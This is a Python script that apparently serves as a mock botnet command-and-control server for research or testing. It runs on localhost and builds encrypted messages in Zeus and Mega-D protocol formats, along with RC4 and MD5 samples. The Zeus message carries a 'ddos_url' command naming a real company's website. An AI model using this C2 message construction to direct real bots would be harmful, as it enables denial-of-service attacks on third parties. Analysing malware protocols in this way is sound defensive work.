import socketserver
from datetime import datetime
import ctypes
import struct
from pyDes import *
import hashlib
import socket

def rc4crypt(data, key):
    x = 0
    box = list(range(256))
    for i in range(256):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(char ^ box[(box[x] + box[y]) % 256])
    
    return bytes(out)

def zeusEncrypt(data):
	r = []
	r.append(data[0])
	for i in range(1, len(data)):
		r.append(data[i] ^ r[i-1])
	return bytes(r)
	
def getZeusRC4Key():
	compName = socket.gethostname().upper()
	m = hashlib.sha1()
	m.update(compName.encode("ascii"))
	return m.digest()

def getC2HttpHeader(contentLen):
	r = "POST /write HTTP/1.1\r\n"
	r += "Content-Length: %d\r\n" % (contentLen)
	r += "Accpet-Encoding:\r\nConnection: close\r\nX-ID: 96730\r\n"
	return bytes(r, "ascii")

def getZeusHeader():
	r = b"\xA6\xEB\x00\xCC"
	m = hashlib.sha1()
	m.update(b"Session #7859")
	r += m.digest()
	r += getZeusRC4Key()
	return r

def getZeusCommandField():
	r = b"ddos_url http://us.blizzard.com/en-us/"
	m = hashlib.md5()
	m.update(r)
	r = m.digest() + r
	print(r)
	return r

def getZeusHttpPayloadField():
	data = getZeusCommandField()
	r = zeusEncrypt(b'\x96' + data)
	return struct.pack("iiii", 1, 0, len(r), len(r)) + r

def getZeusHttpPayloadHeader(nFields, fields):
	r = struct.pack("iii", len(fields), 0, nFields)
	m = hashlib.md5()
	m.update(fields)
	r += m.digest()
	return r

def getZeusHttpPayload():
	field = getZeusHttpPayloadField()
	header = getZeusHttpPayloadHeader(1, field)
	return header + field

def getZeusPayload():
	payload = getZeusHttpPayload()
	r = getC2HttpHeader(len(payload))
	return r + payload

def getZeusMessage():
	header = getZeusHeader()
	payload = getZeusPayload()
	payload = rc4crypt(payload, getZeusRC4Key())
	r = zeusEncrypt(header + payload)
	return r

def getMD5Message():
	r = b"Show Me The Code! Hans Zimmer is God."
	m = hashlib.md5()
	m.update(r)
	return m.digest() + r

def getRC4Message():
	enc = rc4crypt(b"show me the code", b"gossip")
	return struct.pack("i", len(enc)) + enc
	
def getMegaDMessage():
	data = b"abcdefghijklmnopqrstuvwxyz"
	key = b"abcdefgh"
	k = des(key, ECB, pad = b'\0')
	d = k.encrypt(data)
	print("encrypted:", d)
	print("decrypted:", k.decrypt(d))
	print(len(d))
	return struct.pack(">H", len(d) // 8) + d
	
class MyTcpHandler(socketserver.StreamRequestHandler):
	def getMessage(self, method):
		if method == b"rc4":
			return getRC4Message()
		elif method == b"mega-d":
			return getMegaDMessage()
		elif method == b"zeus":
			return getZeusMessage()
		elif method == b"md5":
			return getMD5Message()
		return b"Unknown method"
		

	def handle(self):
		self.method = self.rfile.readline().strip()
		print("{} {} wrote:".format(datetime.now(), self.client_address[0]))
		print(self.method)
		self.wfile.write(self.getMessage(self.method))

def main(argv):
	ctypes.windll.kernel32.SetConsoleTitleA(b"Server")
	HOST, PORT = "localhost", 56789
	server = socketserver.TCPServer((HOST, PORT), MyTcpHandler)
	print("Running server at {} port {}".format(HOST, PORT))
	server.serve_forever()

if __name__ == "__main__":
	#getMegaDMessage()
	#print(getZeusMessage())
	
	#print(rc4crypt(getC2HttpHeader(200), getZeusRC4Key()))
	#print(getZeusHeader())
	#

	main(sys.argv)
	
	#key = b"secret"
	#x = rc4crypt(b"hahahehehohohihi", key)
	#print(bytes(x))
	#y = rc4crypt(x, key)
	#print(bytes(y))
	#print(struct.pack("i", len(y)) + bytes(y))

	